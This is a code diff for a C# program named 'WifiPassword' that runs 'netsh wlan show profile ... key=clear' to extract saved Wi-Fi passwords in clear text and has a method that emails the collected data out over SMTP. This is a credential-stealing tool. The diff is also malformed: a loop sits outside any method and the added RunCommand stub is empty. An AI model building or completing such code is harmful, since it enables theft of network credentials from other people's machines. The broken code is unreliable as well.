@@ -25,14 +25,6 @@ namespace WifiPassword
             return result;
         }
         
-        private static string[] GetProfiles()
-        {
-            var output = RunCommand("netsh", "wlan show profiles"); //method to be created
-            var lines = output.Split(new[] { "\r\n", "\r", "\n" }, StringSplitOptions.None);
-            var result = lines.Where(line => line.Contains(" : ")).Select(x => x.Substring(x.IndexOf(":") + 2)).ToArray();
-            return result;
-        }
-        
            public void SendWifiInfoAsEmail(List<WifiInfo> wifiInfo)
         {
             var smtpClient = new SmtpClient
@@ -62,6 +54,7 @@ namespace WifiPassword
 
             smtpClient.Send(message);
         }
+
         for (int i = 0; i < profiles.Length; i++)
             {
                 var output = RunCommand("netsh", $"wlan show profile \"{profiles[i]}\" key=clear");
@@ -73,5 +66,18 @@ namespace WifiPassword
                 }
             }
 
+            private static string[] GetProfiles()
+            {
+                var output = RunCommand("netsh", "wlan show profiles"); //method to be created
+                var lines = output.Split(new[] { "\r\n", "\r", "\n" }, StringSplitOptions.None);
+                var result = lines.Where(line => line.Contains(" : ")).Select(x => x.Substring(x.IndexOf(":") + 2)).ToArray();
+                return result;
+            }
+
+            private static string RunCommand(string command, string arguments)
+            {
+
+            }
+        
     }
 }
